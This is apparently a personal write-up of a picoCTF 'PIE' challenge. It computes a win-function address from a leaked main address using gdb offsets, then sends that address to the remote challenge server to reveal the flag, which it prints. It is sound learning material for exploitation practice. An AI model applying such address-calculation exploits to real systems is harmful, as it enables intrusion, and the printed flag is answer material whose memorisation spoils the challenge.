$file vuln                                                                                                      
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped

$checksec --file vuln
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

$ cat vuln.c

.....
int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
.....

seems the challenge is to calculate the win address on the system due to PIE.
Load up local file for testing

$ gdb ./vuln
> disass win
  0x12a7 (address)
> disas main
  0x133d

Got the addresses (relavtive) in the local file. Calculate the difference:

$ python
> hex(0x133d-0x12a7)
  0x96

Load up the challenge

$ ./vuln
Address of main: 0x559edba0633d
Enter the address to jump to, ex => 0x12345: 

in another terminal:
$ python
> hex(0x559edba0633d-0x96)
'0x559edba062a7'

C+V the result back in the challenge file:

>559edba062a7
Your input: 559edba062a7
You won!
Cannot open file.

Same now for remote file

$ nc rescued-float.picoctf.net 49994
Address of main: 0x57000a42f33d
Enter the address to jump to, ex => 0x12345: 57000a42f2a7
Your input: 57000a42f2a7 #calculated offline with python as above
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_00dea386}

PIE
binary exploit
relative memory locations
ret2win



